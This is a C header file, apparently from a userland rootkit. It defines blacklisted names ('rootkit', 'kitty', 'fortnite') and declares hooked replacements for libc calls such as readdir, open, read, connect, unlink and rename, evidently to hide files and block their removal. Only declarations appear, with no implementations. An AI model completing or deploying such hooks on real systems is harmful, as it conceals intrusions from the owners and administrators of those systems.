#ifndef HOOKS_H
#define HOOKS_H

#include <dlfcn.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <dirent.h>
#include <unistd.h>
#include <stdbool.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <stdlib.h>
#include <string.h>

/* Blacklisted strings. */

const char *blacklisted_strings[] = {
  "rootkit",
  "kitty"
};

/* Blacklisted filenames. */

const char *blacklisted_filenames[] = {
  "kitty",
  "fortnite"
};

/* Functions used to check if blacklisted stuff is used. */
bool check_blacklisted_strings(const char *string);
bool check_blacklisted_filenames(const char *filename);

/* Various functions. */
ssize_t write(int fd, const void *buf, size_t count);
int puts(const char *s);
int connect(int sockfd, const struct sockaddr *addr, socklen_t addrlen);
int open(const char *pathname, int flags);
ssize_t read(int fd, void *buf, size_t count);
FILE *fopen(const char *pathname, const char *mode);
FILE *fopen64(const char *pathname, const char *mode);
struct dirent *readdir(DIR *dirp);
int rmdir(const char *pathname);
int unlink(const char *pathname);
int unlinkat(int dirfd, const char *pathname, int flags);
int rename(const char *oldpath, const char *newpath);
int renameat(int olddirfd, const char *oldpath, int newdirfd, const char *newpath);
int renameat2(int olddirfd, const char *oldpath, int newdirfd, const char *newpath, unsigned int flags);

#endif
